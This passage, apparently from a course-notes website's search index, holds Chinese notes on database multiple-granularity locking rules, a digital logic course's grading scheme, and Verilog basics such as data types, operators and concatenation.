\u53ef\u4ee5\u6982\u62ec\u5982\u4e0b\uff1a</p> <ul> <li>&lt;1&gt; \u5fc5\u987b\u6ee1\u8db3\u9501\u517c\u5bb9\u6027\u8868</li> <li>&lt;2&gt; \u5fc5\u987b\u5148\u5bf9\u4e00\u68f5\u6811\u7684\u6839\u8282\u70b9\u6dfb\u52a0\u9501\uff0c\u53ef\u4ee5\u7528\u4efb\u610f\u9501\u6a21\u5f0f(S,X,IS,IX,SIX)\u5148\u884c\u9501\u5b9a<ul> <li>\u53ef\u4ee5\u786e\u4fdd\u4e8b\u52a1\u5148\u5360\u9886\u6574\u4e2a\u9501\u5c42\u6b21\u7ed3\u6784\u7684\u5165\u53e3\uff0c\u7136\u540e\u9010\u5c42\u5411\u4e0b\u62d3\u5c55\u9501</li> </ul> </li> <li>&lt;3&gt; \u5982\u679c\u60f3\u5bf9\u67d0\u4e2a\u8282\u70b9 \\(Q\\) \u65bd\u52a0 S \u6216 IS \u9501\uff0c\u5219\u8be5\u8282\u70b9\u7684\u7236\u8282\u70b9\u5fc5\u987b\u5904\u4e8e IS \u6216 IX \u72b6\u6001</li> <li>&lt;4&gt; \u5982\u679c\u60f3\u5bf9\u67d0\u4e2a\u8282\u70b9 \\(Q\\) \u65bd\u52a0 X \u6216 IX \u6216 SIX \u9501\uff0c\u5219\u8be5\u8282\u70b9\u7684\u7236\u8282\u70b9\u5fc5\u987b\u5904\u4e8e IX \u6216 SIX \u72b6\u6001</li> <li>&lt;5&gt; \u6ee1\u8db3 2PL \u534f\u8bae\uff0c\u5982\u679c\u4e8b\u52a1\u5148\u524d\u5bf9\u67d0\u4e2a\u8282\u70b9\u89e3\u9501\uff0c\u5219\u8be5\u4e8b\u52a1\u540e\u7eed\u4e0d\u80fd\u591f\u518d\u65bd\u52a0\u9501</li> <li>&lt;6&gt; \u53ea\u6709\u5f53\u8282\u70b9 \\(Q\\) \u7684\u6240\u6709\u5b50\u8282\u70b9\u90fd\u6ca1\u6709\u88ab \\(T_i\\) \u6301\u6709\u9501\u65f6\uff0c\u4e8b\u52a1 \\(T_i\\) \u624d\u80fd\u89e3\u9501 \\(Q\\)<ul> <li>\u5373\u52a0\u9501\u81ea\u9876\u5411\u4e0b\uff0c\u89e3\u9501\u81ea\u4e0b\u800c\u4e0a</li> </ul> </li> </ul> <p>TBD: Deadlock Handling &amp; Insert, Delete Operations</p>"},{"location":"Courses/DD/","title":"Index","text":"<p> \u7ea6 72 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u5927\u4e00\u4e0b\u5b66\u671f\u6700\u559c\u6b22\u7684\u8bfe\uff0c\u4e5f\u662f\u62ff\u5230\u6ee1\u7ee9\u4e86</p> <ul> <li>2024 \u6570\u5b57\u903b\u8f91\u8bbe\u8ba1 \u5b9e\u9a8c\u6307\u5bfc</li> </ul>"},{"location":"Courses/DD/#_1","title":"\u8bc4\u5206\u6807\u51c6","text":"<ul> <li>\u5b9e\u9a8c\u9a8c\u6536\u53ca\u62a5\u544a 30%</li> <li>\u5927\u7a0b\u5e8f 10%</li> <li>\u4e24\u6b21\u5c0f\u6d4b 20%</li> <li>\u671f\u672b\u8003\u8bd5 40%</li> </ul> <p>\u671f\u672b\u8003\u8bd5\u8981\u6c42\u5377\u9762\u5206\u6570\u9ad8\u4e8e 50 \uff0c\u4e0d\u7136\u6302\u79d1()</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/","title":"Verilog\u57fa\u7840","text":""},{"location":"Courses/DD/Verilog/VerilogBasic/#verilog","title":"Verilog \u57fa\u7840","text":"<p> \u7ea6 2653 \u4e2a\u5b57  188 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p> <p>Note</p> <p>Verilog \u4ee3\u7801\u4e0e\u540c\u5b66\u4eec\u4e4b\u524d\u5b66\u4e60\u7684 C \u8bed\u8a00\u6709\u5f88\u591a\u76f8\u4f3c\u4e4b\u5904\uff0c\u6bd4\u5982\u81ea\u9876\u5411\u4e0b\u8bbe\u8ba1\u601d\u60f3\u3001\u6a21\u5757\u5316\u7f16\u7a0b\u3001\u5faa\u73af\u8bed\u53e5\u3001\u6761\u4ef6\u8bed\u53e5\u3001\u591a\u8def\u5206\u652f\u8bed\u53e5\u7b49\uff0c\u4f46\u662f\u53c8\u4e0e C \u8bed\u8a00\u5927\u4e0d\u76f8\u540c\uff0c\u56e0\u4e3a\u8fd9\u662f\u4e00\u4e2a\u786c\u4ef6\u63cf\u8ff0\u8bed\u8a00\uff0c\u6700\u540e\u6240\u6709\u4ee3\u7801\u90fd\u5c06\u8f6c\u5316\u4e3a\u5404\u79cd\u95e8\u4e0e\u7535\u8def\u7684\u76f8\u8fde\uff0c\u65e0\u8bba\u4f55\u65f6\u540c\u5b66\u4eec\u90fd\u5e94\u8bb0\u4f4f\u8fd9\u4e00\u70b9\uff0c\u5c06 Verilog \u4ee3\u7801\u5f53\u4f5c\u771f\u5b9e\u7684\u786c\u4ef6\u7535\u8def\u53bb\u8bbe\u8ba1\uff0c\u800c\u4e0d\u662f\u5c06 C \u8bed\u8a00\u7f16\u7a0b\u7684\u90a3\u4e00\u5957\u7167\u642c\u5230 Verilog \u7f16\u7a0b\u4e2d\u53bb\u3002</p> <p></p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_1","title":"\u6807\u8bc6\u7b26 \u4e0e \u5173\u952e\u5b57","text":"<p>\u6807\u8bc6\u7b26\u53ef\u4ee5\u662f\u4efb\u610f\u4e00\u7ec4\u5b57\u6bcd\u3001\u6570\u5b57\u3001$ \u7b26\u53f7\u548c _ (\u4e0b\u5212\u7ebf)\u7b26\u53f7\u7684\u5408\uff0c\u4f46\u6807\u8bc6\u7b26\u7684 \u7b2c\u4e00\u4e2a\u5b57\u7b26\u5fc5\u987b\u662f\u5b57\u6bcd\u6216\u8005\u4e0b\u5212\u7ebf\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u6216\u8005\u7f8e\u5143\u7b26\u5f00\u59cb \uff0c\u6807\u8bc6\u7b26\u4e5f\u533a\u5206\u5927\u5c0f\u5199\u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_2","title":"\u5e38\u91cf","text":"<p>Verilog HDL \u4e2d\u6709\u4e0b\u5217\u56db\u79cd\u57fa\u672c\u7684\u503c\u6765\u8868\u793a\u786c\u4ef6\u7535\u8def\u4e2d\u7684\u7535\u5e73\u903b\u8f91\uff1a</p> <ul> <li>0\uff1a\u903b\u8f91 0 \u6216 \"\u5047\"</li> <li>1\uff1a\u903b\u8f91 1 \u6216 \"\u771f\"</li> <li>x \u6216 X\uff1a\u672a\u77e5</li> <li>z \u6216 Z\uff1a\u9ad8\u963b</li> </ul>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_3","title":"\u6574\u578b\u6570\u7684\u5b9a\u4e49","text":"<ul> <li>\u5982\u679c\u5b9a\u4e49\u7684\u957f\u5ea6\u6bd4\u4e3a\u5e38\u91cf\u6307\u5b9a\u7684\u957f\u5ea6\u957f\uff0c\u901a\u5e38\u5728\u5de6\u8fb9\u586b0 \u8865\u4f4d\u3002\u4f46\u662f\u5982\u679c\u6570\u6700\u5de6\u8fb9\u4e00\u4f4d\u4e3ax \u6216z \uff0c\u5c31\u76f8\u5e94\u5730\u7528x \u6216z \u5728\u5de6\u8fb9\u8865\u4f4d\u3002\u4f8b\u5982</li> <li>10'b10  \u5de6\u8fb9\u6dfb0\u5360\u4f4d, 0000000010</li> <li>10'bx0x1    \u5de6\u8fb9\u6dfbx\u5360\u4f4d, x x x x x x _ x 0 x 1</li> <li>\u5982\u679c\u957f\u5ea6\u5b9a\u4e49\u5f97\u66f4\u5c0f\uff0c\u90a3\u4e48\u6700\u5de6\u8fb9\u7684\u4f4d\u76f8\u5e94\u5730\u88ab\u622a\u65ad\u3002\u4f8b\u5982  </li> <li>3 'b1001 _ 0011 \u4e0e 3 'b011 \u76f8\u7b49</li> <li>5 'H0FFF \u4e0e5 'H1F \u76f8\u7b49  //\u6ce8\u610f\uff0c\u4f4d\u5bbd5\u4ee3\u88685\u4f4d\u4e8c\u8fdb\u5236\uff0c\u800c\u4e0d\u662f\u4e94\u4f4d16\u8fdb\u5236\uff01\uff01\uff01</li> </ul>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_4","title":"\u5b57\u7b26\u4e32\u578b\u7684\u5b9a\u4e49","text":"<p>\u4e00\u4e2a\u5b57\u7b26\u75288\u4e3aASCII\u503c\u8868\u793a</p> <pre><code>reg [1:8*14] Message;\n...\nMessage = \"Internal Error\"\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_5","title":"\u6570\u636e\u7c7b\u578b","text":"<p>\u5728\u6211\u4eec\u7684\u6b63\u5e38\u4f7f\u7528\u4e86\uff0c\u53ef\u4ee5\u65e0\u8111\u5b9a\u4e49\u53d8\u91cf\u7c7b\u578b\u4e3a <code>wire</code> \uff0c\u5982\u679c\u62a5\u9519\u4e86\u518d\u6539\u4e3a <code>reg</code> \u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#net-type","title":"\u7ebf\u7f51\u7c7b\u578b net type","text":"<p>\u7ebf\u7f51\u7c7b\u578b\u7528\u4e8e\u5bf9\u7ed3\u6784\u5316\u5668\u4ef6\u4e4b\u95f4\u7684\u7269\u7406\u8fde\u7ebf\u7684\u5efa\u6a21\u3002\u5982\u5668\u4ef6\u7684\u7ba1\u811a\uff0c\u5185\u90e8\u5668\u4ef6\u5982\u4e0e\u95e8\u7684\u8f93\u51fa\u7b49\u3002  </p> <p>\u7531\u4e8e\u7ebf\u7f51\u7c7b\u578b\u4ee3\u8868\u7684\u662f\u7269\u7406\u8fde\u63a5\u7ebf\uff0c\u56e0\u6b64\u5b83\u4e0d\u5b58\u8d2e\u903b\u8f91\u503c\u3002\u5fc5\u987b\u7531\u5668\u4ef6\u6240\u9a71\u52a8\u3002\u901a\u5e38\u7531assign\u8fdb\u884c\u8d4b\u503c\u3002\u5982 <code>assign A = B ^ C\uff1b</code></p> <p>\u5f53\u4e00\u4e2a wire \u7c7b\u578b\u7684\u4fe1\u53f7\u6ca1\u6709\u88ab\u9a71\u52a8\u65f6\uff0c\u7f3a\u7701\u503c\u4e3a Z\uff08\u9ad8\u963b\uff09\u3002</p> <p>\u4fe1\u53f7\u6ca1\u6709\u5b9a\u4e49\u6570\u636e\u7c7b\u578b\u65f6\uff0c\u7f3a\u7701\u4e3a wire \u7c7b\u578b\u3002</p> <p>\u6b64\u5916\uff0c\u5bf9<code>wire</code>\u7684\u8d4b\u503c\u4e0d\u80fd\u5728<code>always</code> / <code>initial</code> \u8bed\u53e5\u4e2d\u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#reg-type","title":"\u5bc4\u5b58\u5668\u7c7b\u578b reg type","text":"<p>reg \u662f\u6700\u5e38\u7528\u7684\u5bc4\u5b58\u5668\u7c7b\u578b\uff0c\u5bc4\u5b58\u5668\u7c7b\u578b\u901a\u5e38\u7528\u4e8e\u5bf9\u5b58\u50a8\u5355\u5143\u7684\u63cf\u8ff0\uff0c\u5982D\u578b\u89e6\u53d1\u5668\u3001 ROM\u7b49\u3002\u5b58\u50a8\u5668\u7c7b\u578b\u7684\u4fe1\u53f7\u5f53\u5728\u67d0\u79cd\u89e6\u53d1\u673a\u5236\u4e0b\u5206\u914d\u4e86\u4e00\u4e2a\u503c\uff0c\u5728\u5206\u914d\u4e0b\u4e00\u4e2a\u503c\u4e4b\u65f6\u4fdd\u7559\u539f\u503c\u3002\u4f46\u5fc5\u987b\u6ce8\u610f\u7684\u662f\uff0c reg \u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u4e0d\u4e00\u5b9a\u662f\u5b58\u50a8\u5355\u5143\uff0c\u5982\u5728always \u8bed\u53e5\u4e2d\u8fdb\u884c\u63cf\u8ff0\u7684\u5fc5\u987b\u7528reg \u7c7b\u578b\u7684\u53d8\u91cf\u3002  </p> <pre><code>reg [msb:lsb] reg1,reg2, ... ,regN //\u6ca1\u6709\u5b9a\u4e49\u8303\u56f4\uff0c\u7f3a\u7701\u503c\u4e3a1\u4f4d\u5bc4\u5b58\u5668\nreg [3:0] Sat\uff1b  //Sat \u662f4\u4f4d\u5bc4\u5b58\u5668\nreg Cnt;        //Cnt \u662f1\u4f4d\u5bc4\u5b58\u5668\n</code></pre> <ul> <li>\u5bc4\u5b58\u5668\u7c7b\u578b\u7684\u503c\u53ef\u53d6\u8d1f\u6570\uff0c\u4f46\u82e5\u8be5\u53d8\u91cf\u7528\u4e8e\u8868\u8fbe\u5f0f\u7684\u8fd0\u7b97\u4e2d\uff0c\u5219\u6309\u65e0\u7b26\u53f7\u7c7b\u578b\u5904\u7406\uff0c\u5982\uff1a  </li> </ul> <pre><code>reg A;\n...\nA = -1;\n...\n</code></pre> <p>\u5219 A \u7684\u4e8c\u8fdb\u5236\u4f4d 1111 \uff0c \u5728\u8fd0\u7b97\u4e2d \uff0c A \u603b\u6309\u65e0\u7b26\u53f7\u6570 15 \u6765\u770b\u5f85</p> <ul> <li>\u7528\u5bc4\u5b58\u5668\u6570\u7ec4\u7c7b\u578b\u6765\u5efa\u7acb\u5b58\u50a8\u5668\u7684\u6a21\u578b\uff0c\u5982\u5bf92\u4e2a8\u4f4d\u7684RAM\u7684\u5efa\u6a21\u5982\u4e0b\uff1a</li> </ul> <pre><code>reg [7:0] Mem[0:1];  //\u4e66\u5199\u89c4\u8303\u5efa\u8bae\uff1a\u5bf9\u6570\u7ec4\u7c7b\u578b\uff0c\u6700\u597d\u6309\u964d\u5e8f\u65b9\u5f0f([7:0])\n...\nMem[0] = `h55;       //\u5bf9\u5b58\u50a8\u5355\u5143\u7684\u8d4b\u503c\u5fc5\u987b\u4e00\u4e00\u8d4b\u503c\nMem[0] = `haa;\n... \n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_6","title":"\u5bf9\u5411\u91cf\u7684\u4e00\u4e9b\u64cd\u4f5c","text":"<pre><code>//\u5b9e\u73b0\u5012\u7f6e\u4e86\nreg [3:0] data = 4'b1011; // data[3:0] = 4'b1011; \nreg [3:0] data_low = data[0:3] ; // data_low[3:0] = 4'b1101\n\nreg addr[8:0] = 9'h10F; // addr[8:0] = 9'b1_0000_1111 \naddr_temp[3:2] = addr[8:7] + 1'b1 ; // addr_temp[3:2] = 2'b11\n</code></pre> <pre><code>// [bit+: width] : \u4ece\u8d77\u59cb bit \u4f4d\u5f00\u59cb\u9012\u589e\uff0c\u4f4d\u5bbd\u4e3a width\u3002 \n// \u4e0b\u9762 2 \u79cd\u8d4b\u503c\u662f\u7b49\u6548\u7684 \nA = data1[31-: 8] ; \nA = data1[31:24] ; \n\n// [bit-: width] : \u4ece\u8d77\u59cb bit \u4f4d\u5f00\u59cb\u9012\u51cf\uff0c\u4f4d\u5bbd\u4e3a width\u3002 \n// \u4e0b\u9762 2 \u79cd\u8d4b\u503c\u662f\u7b49\u6548\u7684 \nB = data1[0+ : 8] ; \nB = data1[0:7] ;\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_7","title":"\u53c2\u6570","text":"<p>\u53c2\u6570\u7528\u6765\u8868\u793a\u5e38\u91cf\uff0c\u7528\u5173\u952e\u5b57 parameter \u58f0\u660e\uff0c\u53ea\u80fd\u8d4b\u503c\u4e00\u6b21\u3002\u4f8b\u5982\uff1a </p><pre><code>parameter \u00a0\u00a0\u00a0 \u00a0data_width = 10'd32 ; \nparameter\u00a0\u00a0\u00a0\u00a0\u00a0 i=1, j=2, k=3 ; \nparameter\u00a0\u00a0\u00a0\u00a0\u00a0 mem_size = data_width * 10 ;\n</code></pre> \u5728\u5b9e\u9645\u7f16\u7a0b\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u7ed9\u5b9a\u7684\u6570\u503c\uff0c\u53ef\u4ee5\u7528parameter\u4ee3\u66ff\uff0c\u4ee5\u589e\u52a0\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u3002"},{"location":"Courses/DD/Verilog/VerilogBasic/#_8","title":"\u65f6\u95f4","text":"<p>Verilog \u4f7f\u7528\u7279\u6b8a\u7684\u65f6\u95f4\u5bc4\u5b58\u5668 time \u578b\u53d8\u91cf\uff0c\u5bf9\u4eff\u771f\u65f6\u95f4\u8fdb\u884c\u4fdd\u5b58\u3002\u5176\u5bbd\u5ea6\u4e00\u822c\u4e3a 64 bit\uff0c\u901a\u8fc7\u8c03\u7528\u7cfb\u7edf\u51fd\u6570 $time \u83b7\u53d6\u5f53\u524d\u4eff\u771f\u65f6\u95f4\u3002 </p><pre><code>time \u00a0\u00a0\u00a0\u00a0\u00a0 current_time ; \ninitial begin \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \n    #100 ; \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \n    current_time = $time ; //current_time \u7684\u5927\u5c0f\u4e3a 100 \nend\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_9","title":"\u8fd0\u7b97\u7b26\u548c\u8868\u8fbe\u5f0f","text":""},{"location":"Courses/DD/Verilog/VerilogBasic/#_10","title":"\u7b97\u672f\u8fd0\u7b97\u7b26","text":"<ul> <li>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\uff0c\u7ed3\u679c\u7684\u4f4d\u5bbd\u53ef\u80fd\u4f1a\u6269\u5c55\uff0c\u56e0\u6b64\u9700\u8981\u5341\u5206\u6ce8\u610f\u7ed3\u679c\u7684\u4f4d\u5bbd\u662f\u5426\u8db3\u591f\uff0c\u5426\u5219\u53ef\u80fd\u5b58\u5728\u9ad8\u4f4d\u88ab\u4e22\u5f03\u7684\u60c5\u51b5\u3002</li> </ul> <pre><code>reg [3:0] add = 3'b111 + 3'b101; \n//\u4e24\u4e2a\u4e09\u4f4d\u7684\u6570\u76f8\u52a0\uff0c\u9700\u8981\u56db\u4f4d\u7684\u5bc4\u5b58\u5668\u6765\u4fdd\u5b58\u7ed3\u679c\uff0c\u907f\u514d\u9ad8\u4f4d\u88ab\u4e22\u5f03 \nreg [6:0] mul = 3'b111 * 4'b1000; \n//\u4e00\u4e2a3\u4f4d\u6570\u4e0e\u4e00\u4e2a4\u4f4d\u6570\u76f8\u4e58\uff0c\u9700\u89813+4=7\u4f4d\u7684\u5bc4\u5b58\u5668\u6765\u4fdd\u5b58\u7ed3\u679c\u3002\n</code></pre> <ul> <li>\u7b97\u672f\u8868\u8fbe\u5f0f\u7ed3\u679c\u7684\u957f\u5ea6\u7531\u6700\u957f\u7684\u64cd\u4f5c\u6570\u51b3\u5b9a\u3002\u5728\u8d4b\u503c\u8bed\u53e5\u4e0b\uff0c\u7b97\u672f\u64cd\u4f5c\u7ed3\u679c\u7684\u957f\u5ea6\u7531\u64cd\u4f5c\u7b26\u5de6\u7aef\u76ee\u6807\u957f\u5ea6\u51b3\u5b9a\u3002  </li> </ul> <pre><code>reg [3:0] Arc,Bar,Crt;\nreg [5:0] Frx;\n...\nArc = Bar+Crt;  //\u7ed3\u679c\u957f\u5ea6\u7531Arc\u51b3\u5b9a\uff0c\u4e3a4\u4f4d\uff0c\u52a0\u6cd5\u64cd\u4f5c\u6ea2\u51fa\u90e8\u5206\u88ab\u4e22\u5f03\nFrx = Bar+Crt;  //\u7ed3\u679c\u957f\u5ea6\u7531Frx\u51b3\u5b9a\uff0c\u4e3a6\u4e3a\uff0c\u52a0\u6cd5\u64cd\u4f5c\u6ea2\u51fa\u90e8\u5206\u5b58\u50a8\u5728Frx[4]\u4e2d\n</code></pre> <ul> <li>\u5728Verilog HDL \u4e2d\u5b9a\u4e49\u4e86\u5982\u4e0b\u89c4\u5219\uff1a\u8868\u8fbe\u5f0f\u4e2d\u7684\u6240\u6709\u4e2d\u95f4\u7ed3\u679c\u5e94\u53d6\u6700\u5927\u64cd\u4f5c\u6570\u7684\u957f\u5ea6\uff08\u8d4b\u503c\u65f6\uff0c\u6b64\u89c4\u5219\u4e5f\u5305\u62ec\u5de6\u7aef\u76ee\u6807\uff09\u3002  </li> </ul> <pre><code>wire [4:1] Box,Drt;\nwire [5:1] Cfg;\nwire [6:1] Peg;\nwire [8:1] Adt;\n...\nassign Adt = (Box+Cfg)+(Drt+Peg); \n/*\u8868\u8fbe\u5f0f\u53f3\u7aef\u7684\u64cd\u4f5c\u6570\u6700\u957f\u4e3a6 \uff0c\u4f46\u662f\u5c06\u5de6\u7aef\u5305\u542b\u5728\u5185\u65f6\uff0c\u6700\u5927\u957f\u5ea6\u4e3a8 \u3002\n *\u6240\u4ee5\u6240\u6709\u7684\u52a0\u64cd\u4f5c\u4f7f\u75288\u4f4d\u8fdb\u884c\u3002\n *\u4f8b\u5982\uff1a Box \u548cCfg \u76f8\u52a0\u7684\u7ed3\u679c\u957f\u5ea6\u4e3a8 \u4f4d\u3002\n */\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_11","title":"\u5173\u7cfb\u8fd0\u7b97\u7b26\u4e0e\u903b\u8f91\u8fd0\u7b97\u7b26","text":"<pre><code>A = 4 ; \nB = 3 ; \nX = 3'b1xx ; \n\nA &gt; B // \u4e3a\u771f \nA &lt;= B // \u4e3a\u5047 \nA &gt;= Z // \u4e3aX\uff0c\u4e0d\u786e\u5b9a \n-------------- \nA = 4 ; \nB = 8'h04 ; \nC = 4'bxxxx ; \nD = 4'hx ;\n\nA == B \u00a0 \u00a0 \u00a0 \u00a0// \u4e3a\u771f \nA == (B + 1) \u00a0// \u4e3a\u5047 \nA == C \u00a0 \u00a0 \u00a0 \u00a0// \u4e3aX\uff0c\u4e0d\u786e\u5b9a \nA === C \u00a0 \u00a0 \u00a0 // \u4e3a\u5047\uff0c\u8fd4\u56de\u503c\u4e3a0 \nC === D \u00a0 \u00a0 \u00a0 // \u4e3a\u771f\uff0c\u8fd4\u56de\u503c\u4e3a1 \u56e0\u4e3a\u53ef\u4ee5\u6309\u4f4d\u6bd4\u8f83\u90fd\u4e3ax \u6240\u4ee5\u4e3a\u771f \n---------------\nA = 3; \nB = 0; \nC = 2'b1x ;\n\n A &amp;&amp; B // \u4e3a\u5047 \n A || B // \u4e3a\u771f \n ! A // \u4e3a\u5047 \n ! B // \u4e3a\u771f \n A &amp;&amp; C // \u4e3aX\uff0c\u4e0d\u786e\u5b9a \n A || C // \u4e3a\u771f\uff0c\u56e0\u4e3aA\u4e3a\u771f\uff0c\u65e0\u8bbaC\u4e3a\u4ec0\u4e48\u90fd\u4e3a\u771f \n (A==2) &amp;&amp; (! B) //\u4e3a\u771f\uff0c\u6b64\u65f6\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u4e3a\u8868\u8fbe\u5f0f\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_12","title":"\u6309\u4f4d\u8fd0\u7b97\u7b26","text":"<p>\u6309\u4f4d\u64cd\u4f5c\u7b26\u4f1a\u5bf9\u4e24\u4e2a\u64cd\u4f5c\u6570\u6309\u4f4d\u64cd\u4f5c\uff0c\u53ef\u4ee5\u7528\u4f5c\u7b5b\u9009\u3001\u5408\u5e76\u3002 \u5e38\u7528\u7684\u6309\u4f4d\u8fd0\u7b97\u7b26\u6709\u53d6\u53cd\uff08~\uff09\uff0c\u4e0e\uff08&amp;\uff09\uff0c\u6216\uff08|\uff09\uff0c\u5f02\u6216\uff08^\uff09\u3002 \u9664\u53d6\u53cd\u5916\uff0c\u5176\u4f59\u5747\u4e3a\u4e24\u76ee\u8fd0\u7b97\u7b26\uff0c\u5982\u679c2\u4e2a\u64cd\u4f5c\u6570\u4f4d\u5bbd\u4e0d\u76f8\u7b49\uff0c\u5219\u7528 0 \u5411\u5de6\u6269\u5c55\u8865\u5145\u8f83\u77ed\u7684\u64cd\u4f5c\u6570\u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_13","title":"\u6761\u4ef6\u8fd0\u7b97\u7b26","text":"<p>\u5f62\u5f0f\uff1a<code>cond_expr ? expr1 : expr2</code></p> <p>\u5982\u679ccond_expr \u4e3a\u771f(\u5373\u503c\u4e3a1 )\uff0c\u9009\u62e9expr1 \uff1b\u5982\u679ccond_expr \u4e3a\u5047(\u503c\u4e3a0 )\uff0c\u9009\u62e9expr2 \u3002\u5982\u679ccond_expr \u4e3a x\u6216z \uff0c\u7ed3\u679c\u5c06\u662f\u6309\u4ee5\u4e0b\u903b\u8f91expr1 \u548cexpr2 \u6309\u4f4d\u64cd\u4f5c\u7684\u503c\uff1a 0 \u4e0e0 \u5f970 \uff0c 1 \u4e0e1 \u5f971 \uff0c\u5176\u4f59\u60c5\u51b5\u4e3ax  \u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_14","title":"\u79fb\u4f4d\u8fd0\u7b97\u7b26","text":"<p>\u79fb\u4f4d\u8fd0\u7b97\u7b26\u5305\u62ec\u5de6\u79fb\uff08&lt;&lt;\uff09\uff0c\u53f3\u79fb\uff08&gt;&gt;\uff09\uff0c\u7b97\u672f\u5de6\u79fb\uff08&lt;&lt;&lt;\uff09\uff0c\u7b97\u672f\u53f3\u79fb\uff08&gt;&gt;&gt;\uff09\uff0c \u62fc\u63a5\u8fd0\u7b97\u7b26\u7528\u5927\u62ec\u53f7 {\uff0c} \u6765\u8868\u793a\uff0c\u7528\u4e8e\u5c06\u591a\u4e2a\u64cd\u4f5c\u6570\uff08\u5411\u91cf\uff09\u62fc\u63a5\u6210\u65b0\u7684\u64cd\u4f5c\u6570\uff08\u5411\u91cf\uff09\uff0c\u4fe1\u53f7\u95f4\u7528\u9017\u53f7\u9694\u5f00\u3002 \u7b97\u672f\u5de6\u79fb\u548c\u903b\u8f91\u5de6\u79fb\u65f6\uff0c\u53f3\u8fb9\u4f4e\u4f4d\u4f1a\u8865 0\u3002</p> <p>\u903b\u8f91\u53f3\u79fb\u65f6\uff0c\u5de6\u8fb9\u9ad8\u4f4d\u4f1a\u8865 0\uff1b\u800c\u7b97\u672f\u53f3\u79fb\u65f6\uff0c\u5de6\u8fb9\u9ad8\u4f4d\u4f1a\u8865\u5145\u7b26\u53f7\u4f4d\uff0c\u4ee5\u4fdd\u8bc1\u6570\u636e\u7f29\u5c0f\u540e\u503c\u7684\u6b63\u786e\u6027\u3002</p> <pre><code>A = 4'b1100 ; \nB = 4'b0010 ; \nA = A &gt;&gt; 2 ; \u00a0 \u00a0 \u00a0 \u00a0//\u7ed3\u679c\u4e3a 4'b0011 \nA = A &lt;&lt; 1; \u00a0 \u00a0 \u00a0 \u00a0 //\u7ed3\u679c\u4e3a 4'b1000 \nA = A &lt;&lt;&lt; 1 ; \u00a0 \u00a0 \u00a0 //\u7ed3\u679c\u4e3a 4'b1000 \nC = B + (A&gt;&gt;&gt;2); \u00a0 \u00a0//\u7ed3\u679c\u4e3a 2 + (-4/4) = 1, 4'b0001\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_15","title":"\u8fde\u63a5\u8fd0\u7b97\u7b26","text":"<pre><code>wire [7:0] Dbus;\nassign Dbus [7:4] = {Dbus[0],Dbus[1],Dbus[2],Dbus[3]};\n//\u4ee5\u53cd\u8f6c\u7684\u987a\u5e8f\u5c06\u4f4e\u7aef\u56db\u4f4d\u8d4b\u503c\u7ed9\u9ad8\u7aef\u56db\u4f4d\nassign Dbus = {Dbus[3:0],Dbus[7:4]};\n//\u9ad8\u56db\u4f4d\u4e0e\u4f4e\u56db\u4f4d\u4ea4\u6362\n</code></pre> <p>\u7531\u4e8e\u975e\u5b9a\u957f\u5e38\u6570\u7684\u957f\u5ea6\u672a\u77e5\uff0c\u4e0d\u5141\u8bb8\u8fde\u63a5\u975e\u5b9a\u5e38\u5e38\u6570\u3002\u4f8b\u5982<code>{Dbus,5}</code>\u6b64\u5f0f\u975e\u6cd5</p> <p>\u79fb\u4f4d\u8fd0\u7b97\u7b26\u548c\u8fde\u63a5\u8fd0\u7b97\u7b26\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7075\u6d3b\u62fc\u63a5\u5f97\u5230\u6211\u4eec\u9700\u8981\u7684\u4e0d\u540c\u4f4d\u7684\u503c</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_16","title":"\u5b8f\u5b9a\u4e49","text":"<pre><code>// \u5728\u4ee3\u7801\u4e2d\u51fa\u73b0\u7684DATA_DW\u5c06\u76f4\u63a5\u88ab\u8f6c\u5316\u4e3a32 \n`define DATA_DW 32 \n//\u7528`S\u6765\u4ee3\u66ff\u7cfb\u7edf\u51fd\u6570$stop; (\u5305\u62ec\u5206\u53f7) \n`define S $stop; \n//\u53ef\u4ee5\u7528`WORD_DEF\u6765\u58f0\u660e32bit\u5bc4\u5b58\u5668\u53d8\u91cf \n`define WORD_DEF reg [31:0]\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_17","title":"\u8d4b\u503c","text":""},{"location":"Courses/DD/Verilog/VerilogBasic/#_18","title":"\u8fde\u7eed\u8d4b\u503c","text":"<p>\u8fde\u7eed\u8d4b\u503c\u8bed\u53e5\u662f Verilog \u6570\u636e\u6d41\u5efa\u6a21\u7684\u57fa\u672c\u8bed\u53e5\uff0c\u7528\u4e8e\u5bf9 wire \u578b\u53d8\u91cf\u8fdb\u884c\u8d4b\u503c\u3002</p> <p>\u5728 Verilog \u4e2d\uff0c\u6211\u4eec\u7528 assign 